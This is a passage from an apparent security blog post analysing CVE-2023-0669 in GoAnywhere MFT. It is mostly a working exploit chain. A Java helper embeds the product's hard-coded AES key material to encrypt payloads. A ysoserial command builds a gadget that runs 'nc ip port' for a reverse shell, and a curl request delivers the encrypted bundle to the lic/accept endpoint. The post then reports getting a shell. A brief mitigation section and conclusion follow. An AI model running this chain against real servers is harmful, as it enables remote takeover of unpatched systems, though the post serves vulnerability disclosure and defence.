        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">encryptedContent</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">encrypt</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span><span class="o">,</span> <span class="nc">String</span> <span class="n">version</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="nc">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="no">ALGORITHM</span><span class="o">);</span>
        <span class="no">KEY</span> <span class="o">=</span> <span class="o">(</span><span class="n">version</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"2"</span><span class="o">))</span> <span class="o">?</span> <span class="n">getInitializationValueV2</span><span class="o">()</span> <span class="o">:</span> <span class="n">getInitializationValue</span><span class="o">();</span>
        <span class="nc">SecretKeySpec</span> <span class="n">keySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SecretKeySpec</span><span class="o">(</span><span class="no">KEY</span><span class="o">,</span> <span class="s">"AES"</span><span class="o">);</span>
        <span class="nc">IvParameterSpec</span> <span class="n">ivSpec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">IvParameterSpec</span><span class="o">(</span><span class="no">IV</span><span class="o">);</span>
        <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="nc">Cipher</span><span class="o">.</span><span class="na">ENCRYPT_MODE</span><span class="o">,</span> <span class="n">keySpec</span><span class="o">,</span> <span class="n">ivSpec</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">encryptedObject</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
        <span class="nc">String</span> <span class="n">bundle</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">getUrlEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">encryptedObject</span><span class="o">);</span>
        <span class="nc">String</span> <span class="n">v</span> <span class="o">=</span> <span class="o">(</span><span class="n">version</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"2"</span><span class="o">))</span> <span class="o">?</span> <span class="s">"$2"</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>
        <span class="n">bundle</span> <span class="o">+=</span> <span class="n">v</span><span class="o">;</span>
        <span class="k">return</span> <span class="n">bundle</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">getInitializationValue</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="c1">// Version 1 Encryption</span>
        <span class="nc">String</span> <span class="n">param1</span> <span class="o">=</span> <span class="s">"go@nywhereLicenseP@$$wrd"</span><span class="o">;</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">param2</span> <span class="o">=</span> <span class="o">{-</span><span class="mi">19</span><span class="o">,</span> <span class="mi">45</span><span class="o">,</span> <span class="o">-</span><span class="mi">32</span><span class="o">,</span> <span class="o">-</span><span class="mi">73</span><span class="o">,</span> <span class="mi">65</span><span class="o">,</span> <span class="mi">123</span><span class="o">,</span> <span class="o">-</span><span class="mi">7</span><span class="o">,</span> <span class="mi">85</span><span class="o">};</span>
        <span class="k">return</span> <span class="nc">SecretKeyFactory</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"PBKDF2WithHmacSHA1"</span><span class="o">)</span>
                <span class="o">.</span><span class="na">generateSecret</span><span class="o">(</span><span class="k">new</span> <span class="nc">PBEKeySpec</span><span class="o">(</span><span class="n">param1</span><span class="o">.</span><span class="na">toCharArray</span><span class="o">(),</span> <span class="n">param2</span><span class="o">,</span> <span class="mi">9535</span><span class="o">,</span> <span class="mi">256</span><span class="o">))</span>
                <span class="o">.</span><span class="na">getEncoded</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">getInitializationValueV2</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="c1">// Version 2 Encryption</span>
        <span class="nc">String</span> <span class="n">param1</span> <span class="o">=</span> <span class="s">"pFRgrOMhauusY2ZDShTsqq2oZXKtoW7R"</span><span class="o">;</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">param2</span> <span class="o">=</span> <span class="o">{</span><span class="mi">99</span><span class="o">,</span> <span class="mi">76</span><span class="o">,</span> <span class="mi">71</span><span class="o">,</span> <span class="mi">87</span><span class="o">,</span> <span class="mi">49</span><span class="o">,</span> <span class="mi">74</span><span class="o">,</span> <span class="mi">119</span><span class="o">,</span> <span class="mi">83</span><span class="o">,</span> <span class="mi">109</span><span class="o">,</span> <span class="mi">112</span><span class="o">,</span> <span class="mi">50</span><span class="o">,</span> <span class="mi">75</span><span class="o">,</span> <span class="mi">104</span><span class="o">,</span> <span class="mi">107</span><span class="o">,</span> <span class="mi">56</span><span class="o">,</span> <span class="mi">73</span><span class="o">};</span>
        <span class="k">return</span> <span class="nc">SecretKeyFactory</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"PBKDF2WithHmacSHA1"</span><span class="o">)</span>
                <span class="o">.</span><span class="na">generateSecret</span><span class="o">(</span><span class="k">new</span> <span class="nc">PBEKeySpec</span><span class="o">(</span><span class="n">param1</span><span class="o">.</span><span class="na">toCharArray</span><span class="o">(),</span> <span class="n">param2</span><span class="o">,</span> <span class="mi">3392</span><span class="o">,</span> <span class="mi">256</span><span class="o">))</span>
                <span class="o">.</span><span class="na">getEncoded</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>
<p>first, we need to compile the code by this command</p>

<p>javac CVE_2023_0669_helper.java &amp;&amp; java CVE_2023_0669_helper</p>

<p>about the code simply take the hard-coded keys that were provided in the application source code and encrypt the data using AES with CBC mode and  PKCS5 padding. by giving it the file path and version number  java CVE_2023_0669_helper [file_path] [version]</p>

<p>as arguments. and print the payload string as Base64 encode we will cover it in the PoC section</p>

<h2 id="the-proof-of-concept--exploitation">The Proof Of Concept &amp;&amp; Exploitation</h2>

<p>i will use linux in this Proof of Consept but it not depends on the operation system to get RCE (Remote Code Eexecution)</p>

<p>using  ysoserial to create our payload like the following command and enctypt it</p>

<p>Command: <code class="language-plaintext highlighter-rouge">java -jar ysoserial-all.jar CommonsBeanutils1 "nc ip port " &gt; PoC.ser</code> 
and to dcyrypt the ysoserial payload by our custom script</p>

<p>Command: <code class="language-plaintext highlighter-rouge">java -jar CVE2023-helper.jar File\_name &lt;the version number(1,2)&gt;</code></p>

<p><img src="/public/media/9.jpeg" /></p>

<p>and as we show above  lic/accept is the endpoint that receives the bundle request and it doesn’t matter if the request method was  GET or  POST , we can also exploit this by command line with  curl by the following</p>

<p>Command:  curl -ivs POST ‘http://192.168.1.10:8000/goanywhere/lic/accept?bundle=’$(cat final_payload.txt) which  final_payload will be the  ysoserial output after encryption by our tool</p>

<p><img src="/public/media/12.gif" /></p>

<p>and we get shell the exploit work in windows,Linux and any system have goanyhere because the application depends on java installation not The Operation System</p>

<p><img src="/public/media/11.jpeg" /></p>
<h2 id="mitigation">Mitigation</h2>

<p>it’s important to keep up to date with your apps and software but sometimes you can’t update them and don’t have this choice so here is the mitigation and how to limit goanywhere from this Vulnerability and to make sure it’s not v the admin console shouldn’t be exposed in online</p>

<p>1. go to  /adminroot/WEB_INF/web.xml which is the servlet-mapping configuration and add Multiline comments by adding <!-- --> because it’s  xml Programming language format, which this edit will disable this endpoint like the following picture and limit the attack</p>

<p><img src="/public/media/10.png" /></p>

<h2 id="conclusion">Conclusion</h2>

<p>During the analysis, we discovered why developers should not trust any object passed by the user and exposed senesetive information like secert-keys. We also identified how this practice can be extremely dangerous, and the potential security implications of such actions became clear.</p>

<p><a href="https://github.com/yosef0x01/CVE-2023-0669-Analysis"> The Github repo</a></p>]]></content><author><name>Youssef Muhammad</name></author><category term="RCE" /><summary type="html"><![CDATA[Introduction]]></summary></entry></feed>